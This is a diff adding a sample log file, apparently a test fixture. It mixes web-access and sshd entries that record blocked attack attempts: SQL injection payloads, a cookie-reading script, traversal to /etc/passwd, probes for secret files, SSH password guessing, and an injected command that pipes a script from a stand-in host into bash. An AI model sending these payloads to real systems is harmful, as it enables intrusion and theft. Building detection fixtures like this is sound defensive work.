@@ -1,0 +1,16 @@
+185.220.101.77 - - [02/Sep/2026:11:04:11 +0000] "GET /api/v2/users?id=1' OR 1=1-- HTTP/1.1" 403 312
+45.155.205.201 - - [02/Sep/2026:11:04:12 +0000] "GET /api/v2/users?id=1 UNION SELECT password FROM users-- HTTP/1.1" 403 298
+45.155.205.201 - - [02/Sep/2026:11:04:13 +0000] "GET /api/v2/search?q=test' AND SLEEP(5)-- HTTP/1.1" 403 256
+{"timestamp":"2026-09-02T11:04:15Z","source":"sshd","message":"Failed password for root from 103.45.12.90 port 44112 ssh2","ip":"103.45.12.90","user":"root"}
+Sep  2 11:04:18 auth-01 sshd: Failed password for admin from 103.45.12.90 port 44118 ssh2
+Sep  2 11:04:19 auth-01 sshd: Failed password for ubuntu from 103.45.12.90 port 44119 ssh2
+Sep  2 11:04:20 auth-01 sshd: Failed password for oracle from 103.45.12.90 port 44120 ssh2
+10.0.0.22 - - [02/Sep/2026:11:04:20 +0000] "GET /health HTTP/1.1" 200 87
+91.219.237.44 - - [02/Sep/2026:11:04:21 +0000] "GET /contact?msg=<script>document.cookie</script> HTTP/1.1" 400 120
+51.15.0.77 - - [02/Sep/2026:11:04:22 +0000] "GET /.env HTTP/1.1" 404 80
+51.15.0.77 - - [02/Sep/2026:11:04:23 +0000] "GET /.git/config HTTP/1.1" 404 80
+51.15.0.77 - - [02/Sep/2026:11:04:24 +0000] "GET /wp-admin HTTP/1.1" 404 80
+51.15.0.77 - - [02/Sep/2026:11:04:25 +0000] "GET /phpmyadmin HTTP/1.1" 404 80
+177.54.88.19 - - [02/Sep/2026:11:04:26 +0000] "GET /static/../../etc/passwd HTTP/1.1" 403 64
+194.26.29.50 - - [02/Sep/2026:11:04:27 +0000] "GET /api/v2/tools/ping?host=8.8.8.8;curl http://evil.example/s.sh | bash HTTP/1.1" 403 90
+52.12.88.10 - - [02/Sep/2026:11:04:28 +0000] "GET /api/v2/catalog HTTP/1.1" 200 4312
